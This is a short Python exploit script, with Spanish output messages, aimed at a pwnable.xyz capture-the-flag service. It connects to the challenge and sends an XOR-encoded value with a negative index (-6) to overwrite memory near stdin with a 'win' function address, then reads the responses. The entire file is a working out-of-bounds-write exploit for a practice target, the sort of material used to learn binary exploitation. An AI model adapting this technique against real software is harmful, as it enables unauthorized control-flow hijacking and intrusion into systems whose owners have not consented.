#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

print("Conectando...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)

time.sleep(3)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21

print(f"Sobrescribiendo SOLO offset -6 (stdin+208) con win={hex(win)}...")

b = 0x6666666666666666
a = win ^ b

s.sendall(f"{a} {b} -6\n".encode())

time.sleep(1)

print("Intentando recibir...")
try:
    data = s.recv(4096)
    print(f"Recibido: {data.decode()}")
except Exception as e:
    print(f"Error: {e}")

# Intentar enviar más
print("\nIntentando otro input...")
try:
    s.sendall(b"1 2 3\n")
    time.sleep(2)
    data2 = s.recv(4096)
    print(f"Recibido 2: {data2.decode()}")
except Exception as e:
    print(f"Error 2: {e}")

s.close()